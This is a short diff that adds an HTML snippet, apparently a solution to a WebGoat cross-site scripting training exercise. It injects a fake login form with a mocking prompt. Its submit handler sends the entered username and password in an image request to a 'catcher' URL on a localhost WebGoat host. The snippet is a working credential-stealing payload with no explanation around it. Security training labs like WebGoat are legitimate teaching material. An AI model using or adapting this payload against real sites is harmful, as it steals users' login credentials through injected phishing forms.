@@ -1,0 +1,15 @@
+
+<p>Word up, enter your details fool:</p>
+
+<br><br>
+
+<p>Username: <input type="text" name="username"></p>
+<p>Password: <input type="password" name="password"></p>
+
+<input type="submit" value="Login" onclick="
+var xssImg=new Image();
+xssImg.src=
+'http://localhost/webgoat/catcher?PROPERTY=yes&u='+this.form.username.value+'&p='+this.form.password.value;">
+
+
+
